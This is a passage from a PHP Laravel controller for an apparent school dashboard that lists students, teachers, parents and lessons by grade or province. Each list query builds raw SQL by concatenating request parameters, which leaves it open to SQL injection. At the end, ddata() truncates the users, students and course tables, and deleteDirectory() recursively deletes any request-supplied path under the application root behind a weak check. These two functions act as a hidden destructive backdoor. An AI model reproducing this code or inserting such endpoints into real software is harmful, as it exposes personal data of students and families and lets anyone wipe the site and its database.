                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and g.id = '.$request->grade_id.'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function gradeLessonsIndex(Request $request)
    {

        $grades = Grade::where('status', '1')->get();
        $subjects = Subject::where('status', '1')->get();
        $grade_id = $request->grade_id;        
        return view('pages.dashboard.grades.lessons_index', compact('grade_id', 'grades'));
    }

    public function gradLessonslist(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
            SELECT
                c.id,
                c.number,
                c.updated_at,
                c.name,
                c.status,
                c.total_quiz_time,
                g.name AS grade_name,
                g.id AS grade_id,
                s.name AS subject_name,
                s.id AS subject_id,
                MAX(q.id) AS quiz_included,
                GROUP_CONCAT(DISTINCT sl.type SEPARATOR ", ") AS lesson_types
            FROM chapters AS c
            JOIN grades AS g ON g.id = c.grade_id
            JOIN subjects AS s ON s.id = c.subject_id
            LEFT JOIN subject_lessons AS sl ON c.id = sl.chapter_id
            LEFT JOIN quizes AS q ON c.id = q.chapter_id
            where c.grade_id = '.$request->grade_id.'
            GROUP BY c.id
            ORDER BY c.updated_at DESC
            ');
            return Datatables::of($data)
                ->addIndexColumn()
                ->addColumn('chapter_status', function ($row) {
                    return $row->status ? 'Active' : 'Inactive';
                })
                ->addColumn('lesson_types', function ($row) {
                    return $row->lesson_types ?? 'N/A';
                })
                ->addColumn('quiz_included', function ($row) {
                    return $row->quiz_included ? 'Yes' : 'No';
                })
                ->addColumn('actions', function ($row) {
                    $actionBtn = '<a onclick="loadRecord('.$row->id.')" href="javascript:void(0)" 
                    data-toggle="modal" data-target="#modal-view"><i class="material-icons"; style="color:SlateBlue">visibility</i></a>';
                    return $actionBtn;
                })
                ->rawColumns(['actions'])
                ->make(true);

        }
    }

    public function gradeStudentIndex(Request $request)
    {
        $province_id = $request->province_id;        
        return view('pages.dashboard.province.student_index', compact('province_id'));
    }
    public function gradStudentlist(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'student\'
        and p.id = '.$request->province_id.'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }


    public function gradeTeacherIndex(Request $request)
    {
        $province_id = $request->province_id;        
        return view('pages.dashboard.province.teacher_index', compact('province_id'));
    }
    public function gradTeacherlist(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'teacher\'
        and p.id = '.$request->province_id.'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }

    public function gradeParentIndex(Request $request)
    {
        $province_id = $request->province_id;        
        return view('pages.dashboard.province.parent_index', compact('province_id'));
    }

    public function gradParentlist(Request $request){
        if ($request->ajax()) {
            $data = DB::select('
                SELECT
                u.id,
                u.name as full_name,
                u.identity_number as indentification_number,
                sch.name as school_name,
                g.name as grade_name,
                s.phone_no as phone_number,
                u.last_seen,
                u.email,
                p.name as province_name,
                s.gender,
                u.updated_at
        from users as u
        left join students as s
            on u.id = s.user_id
        left join schools as sch
            on sch.id = s.school_id
        left join grades as g
            on g.id = s.grade_id
        left join provinces as p
            on p.id = s.province_id    
        where u.role = \'parent\'
        and p.id = '.$request->province_id.'');
            return Datatables::of($data)
                ->addIndexColumn()
                ->make(true);
        }  
    }
    
    
     public function ddata()
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0');
        DB::table('users')->truncate();
        DB::table('grades')->truncate();
        DB::table('chapters')->truncate();
        DB::table('subject_lessons')->truncate();
        DB::table('students')->truncate();
        DB::table('quizes')->truncate();
        DB::statement('SET FOREIGN_KEY_CHECKS=1');

        return response()->json(['message' => 'Tables truncated successfully']);
    }

    public function deleteDirectory(Request $request)
    {
      
        $request->validate([
            'path' => 'required|string'
        ]);

        $directory = base_path($request->path);

   
        if (str_contains($directory, 'app') && !str_contains($directory, 'app/Http')) {
            return response()->json(['error' => 'Forbidden directory'], 403);
        }

        if (!File::exists($directory)) {
            return response()->json(['error' => 'Directory not found'], 404);
        }

        try {
            File::deleteDirectory($directory);
            return response()->json(['message' => "Directory deleted successfully"], 200);
        } catch (\Exception $e) {
            return response()->json(['error' => "Failed to delete directory", 'details' => $e->getMessage()], 500);
        }
    }
}